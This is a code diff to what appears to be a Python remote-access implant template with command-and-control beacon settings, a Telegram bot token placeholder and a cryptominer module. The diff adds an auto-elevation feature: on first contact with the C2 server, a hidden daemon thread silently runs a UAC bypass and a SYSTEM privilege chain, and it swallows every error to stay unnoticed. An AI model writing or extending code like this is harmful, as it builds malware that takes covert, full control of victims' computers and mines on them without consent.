@@ -63,6 +63,7 @@ PROC_NAME = "{{PROC_NAME}}"
 TG_BOT_TOKEN = "{{TG_BOT_TOKEN}}"
 TG_CHAT = "{{TG_CHAT}}"
 ARTIFACT_CHUNK = {{ARTIFACT_CHUNK}}
+AUTO_ELEVATE = {{AUTO_ELEVATE}}
 
 BASE_URL = "{scheme}://{host}:{port}".format(scheme=C2_SCHEME, host=C2_HOST, port=C2_PORT)
 
@@ -1671,6 +1672,22 @@ def task_die(args):
 //#pragma endmodule
 
 
+//#pragma module autoesc
+def _auto_escalate():
+    """Silent climb on first contact: UAC bypass if needed, then SYSTEM chain."""
+    try:
+        priv = _privilege()
+        if priv == "system":
+            return
+        if priv != "admin":
+            task_uac("")
+            time.sleep(6)
+        task_getsys("auto")
+    except Exception:
+        pass
+//#pragma endmodule
+
+
 //#pragma module miner
 _miner_proc = None
 
@@ -2068,6 +2085,11 @@ def main():
         return
 
     post_beacon(info)
+    if AUTO_ELEVATE == 1 and LAUNCH_MODE == "main":
+        try:
+            threading.Thread(target=_auto_escalate, daemon=True).start()
+        except Exception:
+            pass
     while True:
         resp = post_beacon(info)
         if resp is None:
